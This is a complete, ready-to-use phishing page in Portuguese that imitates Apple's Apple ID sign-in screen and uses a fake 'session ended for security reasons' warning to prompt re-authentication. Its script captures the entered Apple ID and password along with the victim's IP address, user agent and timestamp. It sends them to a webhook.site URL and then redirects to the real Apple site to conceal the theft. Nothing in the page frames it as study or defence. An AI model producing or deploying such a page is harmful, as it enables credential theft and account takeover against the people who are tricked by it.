<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title>Iniciar sessão - Apple ID</title>
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, sans-serif;
      background-color: #f5f5f7;
      margin: 0;
      padding: 0;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }
    .container {
      background: white;
      padding: 40px;
      border-radius: 20px;
      box-shadow: 0 0 15px rgba(0,0,0,0.1);
      max-width: 320px;
      width: 100%;
    }
    h2 {
      text-align: center;
      margin-bottom: 24px;
      font-size: 20px;
    }
    input {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 8px;
      font-size: 16px;
    }
    button {
      width: 100%;
      padding: 12px;
      background-color: #0071e3;
      color: white;
      font-size: 16px;
      border: none;
      border-radius: 8px;
      cursor: pointer;
    }
    button:hover {
      background-color: #005bb5;
    }
    .warning {
      color: #d32f2f;
      font-size: 14px;
      text-align: center;
      margin-top: 10px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Iniciar sessão com Apple ID</h2>
    <p class="warning">⚠️ Por motivos de segurança, sua sessão foi encerrada. Reautentique-se.</p>
    <form id="loginForm">
      <input type="text" name="apple_id" placeholder="Apple ID" required>
      <input type="password" name="password" placeholder="Senha" required>
      <button type="submit">Continuar</button>
    </form>
  </div>

  <script>
    document.getElementById("loginForm").addEventListener("submit", async function(e) {
      e.preventDefault(); // Impede o envio padrão do formulário

      // Coleta os dados do formulário
      const formData = {
        apple_id: document.getElementsByName("apple_id")[0].value,
        password: document.getElementsByName("password")[0].value,
        ip: await fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => data.ip),
        user_agent: navigator.userAgent,
        timestamp: new Date().toISOString()
      };

      // Envia os dados para o webhook (JÁ COM SEU LINK!)
      fetch('https://webhook.site/e9026c1f-9cde-4e6c-9d5d-bc2eb5f83418', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(formData)
      })
      .then(response => {
        if (response.ok) {
          // Redireciona para o site real da Apple após o envio
          window.location.href = "https://appleid.apple.com/";
        }
      })
      .catch(error => {
        console.error("Erro ao enviar dados:", error);
        window.location.href = "https://appleid.apple.com/"; // Redireciona mesmo se falhar
      });
    });
  </script>
</body>
</html>
